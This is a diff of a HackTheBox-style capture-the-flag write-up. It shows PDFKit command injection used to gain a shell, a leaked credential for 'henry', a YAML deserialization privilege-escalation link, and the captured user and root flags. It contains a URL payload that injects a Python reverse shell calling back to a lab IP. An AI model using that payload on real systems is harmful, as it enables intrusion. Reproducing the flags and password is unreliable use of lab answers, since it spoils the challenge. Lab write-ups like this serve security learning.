@@ -60,8 +60,7 @@ Date: 06-01-2023\
 
 ***Covert webpage to PDF***
 
-Remote url is not possible
-
+Remote url is not possible\
 Try a local url
 
 <img width="376" alt="image" src="https://user-images.githubusercontent.com/115549820/210989391-dc1ff35b-f3fc-40dd-8d0b-bcde76d3b37c.png">
@@ -79,7 +78,7 @@ Try a local url
 
 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
-> String for shell, ruby and php doesnt work
+> String for shell, ruby and php doesnt work\
 > http://10.10.14.10/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",9996));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 
 <img width="468" alt="image" src="https://user-images.githubusercontent.com/115549820/210998267-f50647ad-4f4b-44d2-8c92-157d67aa0bd7.png">
@@ -115,7 +114,7 @@ https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
 <img width="571" alt="image" src="https://user-images.githubusercontent.com/115549820/211002491-29b82ff7-cdc5-4b55-a00a-18c272308e39.png">
 
-> Possible Credential for Henry
+> Possible Credential for Henry\
 > henry:Q3c1AqGHtoI0aXAYFH
 
 ***Login with creds***
@@ -150,6 +149,28 @@ https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
 https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml
 
+<img width="999" alt="image" src="https://user-images.githubusercontent.com/115549820/211015907-f71d0717-aa98-45f9-8762-4eb5ab011275.png">
 
+<img width="452" alt="image" src="https://user-images.githubusercontent.com/115549820/211017027-bf6b40ae-be99-4b9b-b638-c70def98ea79.png">
+
+<img width="553" alt="image" src="https://user-images.githubusercontent.com/115549820/211017193-70a599d8-94c0-4121-b0b8-e8c4a5b74d57.png">
+
+***root.txt***
+
+<img width="553" alt="image" src="https://user-images.githubusercontent.com/115549820/211017417-965a42c5-dd20-487f-9a69-f8b4579f2f03.png">
+
+<img width="558" alt="image" src="https://user-images.githubusercontent.com/115549820/211017493-f1e88e7b-9e5e-4433-9c34-05b9733b93ba.png">
+
+***User priv***
+
+<img width="558" alt="image" src="https://user-images.githubusercontent.com/115549820/211018343-6bfb444d-f20f-47b8-9803-b0642a91eb3f.png">
+
+<img width="558" alt="image" src="https://user-images.githubusercontent.com/115549820/211018437-dae62518-2f5f-406a-aad2-2c9b41950df9.png">
 
 ## HackTheBox Questions
+
+> user.txt\
+> 3c1d18b1128caeef16e030ac29de397a
+
+> root.txt\
+> c73e24570adc39250011678408e58938
